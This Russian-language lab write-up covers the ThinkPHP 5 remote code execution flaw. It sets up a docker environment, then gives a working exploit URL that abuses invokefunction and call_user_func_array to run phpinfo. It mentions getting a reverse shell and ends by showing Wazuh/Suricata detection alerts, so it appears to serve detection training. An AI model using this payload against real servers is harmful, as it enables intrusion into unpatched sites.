# 5-rce

ThinkPHP — чрезвычайно широко используемая среда PHP разработки в Китае. В пятой версии ThinkPHP, поскольку платформа неправильно обрабатывает имя контроллера, она может выполнить любой метод, если на веб-сайте не включена обязательная маршрутизация (которая используется по умолчанию), что приводит к уязвимости RCE.

### Эксплуатация уязвимости

Для запуска уязвимой среды выполните команду:

```
docker compose up -d
```

После запуска по адресу http://ваш-ip:8080 будет доступна стандартна страница ThinkPHP

<figure><img src="../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

Посетите следующую страницу для реализации уязвимости и вывода страницы phpinfo

```
http://ваш-ip:8080/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1
```

<figure><img src="../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

Также вы можете выполнять произвольные команды на целевой машине вплоть до получения обратной оболочки уязвимой машины:

<figure><img src="../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

В Wazuh (https://ваш-ip/app/wazuh) мы можем увидеть соответствующие алерты от IDS Suricata об эксплуатации данной уязвимости.

<figure><img src="../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>
